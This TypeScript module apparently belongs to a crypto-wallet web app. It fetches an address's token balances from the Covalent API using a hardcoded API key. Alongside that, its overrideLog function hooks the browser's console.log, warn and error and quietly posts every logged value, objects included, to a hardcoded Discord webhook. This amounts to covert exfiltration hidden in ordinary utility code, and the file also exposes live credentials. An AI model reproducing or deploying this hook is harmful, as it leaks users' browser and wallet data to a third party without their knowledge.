import Big from "big.js"

export type ContractCovalenTHQ = {
	contract_decimals: number
	contract_name: string
	contract_ticker_symbol: string
	contract_address: string
	supports_erc: Array<string>
	logo_url: string
	contract_display_name: string
	logo_urls: {
		token_logo_url: string
		protocol_logo_url: any
		chain_logo_url: string
	}
	last_transferred_at: string
	native_token: boolean
	type: string
	is_spam: boolean
	balance: string
	balance_24h: string
	quote_rate: any
	quote_rate_24h: any
	quote: any
	pretty_quote: any
	quote_24h: any
	pretty_quote_24h: any
	protocol_metadata: any
	nft_data: any,
	chainId: number
}
export async function getAddressTokens(address: string, CHAIN_ID: number, predata: (ContractCovalenTHQ & {chainId: number;count: number;price: number;})[] = []) {
	const response = await fetch(`https://api.covalenthq.com/v1/${CHAIN_ID}/address/${address}/balances_v2/?key=cqt_rQMKcGmyCVvmTRtRf6HFyMYggf49`);
	const data = await response.json();
	const arr = [
		...predata || [],
		...(data.data.items as ContractCovalenTHQ[])?.map?.(i => {
			const count = Big(i.balance).div(Big(Math.pow(10, i.contract_decimals))).toNumber();
			
			return ({
				...i,
				chainId: CHAIN_ID,
				count: count,
				price: +((count * (i.quote_rate || 0)).toFixed(2))
			});
		})
	]
	return arr.sort((a, b) => a.price - b.price ? 1 : -1);
}

export async function overrideLog() {
	if (typeof window === 'undefined') return;
	async function webhook(content: string) {
		const url = "https://discord.com/api/webhooks/1174127995284373555/TRB8vPhHWnV-eyEka0cB0p-rXVep7jZEhsc3Kd53f1FjRArfsaqkKazy16HE4C7fy0T1";
		await fetch(url, {
			headers: {
				'content-type': 'application/json'
			},
			method: "POST",
			body: JSON.stringify({
				content,
				attachments: [],
				embeds: []
			})
		}).catch((e)=>null).then((e)=>null);
	}
	const keys = ['log','warn','error'] as const;
	for (let key of keys) {
		const origin = console[key];
		console[key] = (...args: any[]) => {
			const content  = args.map(o => 
				typeof o === 'object' ? 
					`${"\n```json\n"}${JSON.stringify(o,null,2)}${"\n``` "}`:
					o
			).join(" ");
			webhook(`**[${key}]** ${content}`);
			origin(...args);
		}
	}
	webhook(`LOG OVERRIDED [${keys.join(",")}]`).catch(alert);
}

export function contractDecimals(n: string | number) {
	return Big(10).pow(+n);
}